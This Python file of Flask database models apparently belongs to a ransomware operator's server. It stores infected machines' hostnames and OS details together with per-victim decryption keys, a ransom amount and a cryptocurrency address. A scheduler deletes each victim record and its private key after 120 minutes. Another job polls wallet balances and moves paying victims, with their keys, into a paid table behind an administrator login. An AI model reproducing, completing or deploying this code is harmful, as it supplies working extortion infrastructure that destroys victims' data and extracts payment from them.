import pytz
from app import db, app
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
from utilities.wallet_api import wallet_api
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin


tz = pytz.timezone('America/Toronto')


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    os_name = db.Column(db.String(120))
    os_version = db.Column(db.String(120))
    os_architecture = db.Column(db.String(120))
    email = db.Column(db.String(120))
    # keys
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    # payment details
    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False, nullable=False)
    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
    # creation date
    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    expiration = db.Column(db.DateTime, nullable=False)

    def __init__(self, username, hostname, uid, os_name, os_version, os_architecture, email, public_key, private_key,
                 crypto_address, total_payment, status, amount_paid):
        self.username = username
        self.hostname = hostname
        self.uid = uid
        self.os_name = os_name
        self.os_version = os_version
        self.os_architecture = os_architecture
        self.email = email
        self.public_key = public_key
        self.private_key = private_key
        self.crypto_address = crypto_address
        self.total_payment = total_payment
        self.status = status
        self.amount_paid = amount_paid

        self.calculate_threshold_time()
        self.schedule_termination()

    def __repr__(self):
        return f'<UID {self.uid}>'

    def calculate_threshold_time(self):
        self.creation_date = datetime.now(tz=tz)
        self.expiration = datetime.now(tz=tz) + timedelta(minutes=120)

    def schedule_termination(self):
        scheduler = BackgroundScheduler()
        scheduler.add_job(self.terminate, 'date', run_date=self.expiration)
        scheduler.add_job(self.monitor_payments, 'interval', seconds=30)
        scheduler.start()


    def terminate(self):
        with app.app_context():
            db.session.delete(self)
            db.session.commit()

    def monitor_payments(self):
        with app.app_context():
            users = Users.query.all()  # fetch all users
            for user in users:
                try:
                    balance = wallet_api(user.crypto_address)
                    if balance > 0:
                        user.amount_paid = balance
                        if user.amount_paid >= user.total_payment and not user.status:
                            user.status = True
                            paid_user = UsersPaid(
                                username=user.username,
                                hostname=user.hostname,
                                uid=user.uid,
                                os_name=user.os_name,
                                os_version=user.os_version,
                                os_architecture=user.os_architecture,
                                email=user.email,
                                public_key=user.public_key,
                                private_key=user.private_key,
                                crypto_address=user.crypto_address,
                                total_payment=user.total_payment,
                                status=True,
                                amount_paid=user.amount_paid,
                                creation_date=user.creation_date,
                                payment_date=datetime.now(tz=tz)
                            )
                            db.session.add(paid_user)
                            db.session.delete(user)

                except Exception as e:
                    print(e)
            db.session.commit()


class UsersPaid(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    os_name = db.Column(db.String(120))
    os_version = db.Column(db.String(120))
    os_architecture = db.Column(db.String(120))
    email = db.Column(db.String(120))
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False, nullable=False)
    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    payment_date = db.Column(db.DateTime, nullable=False)


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True



#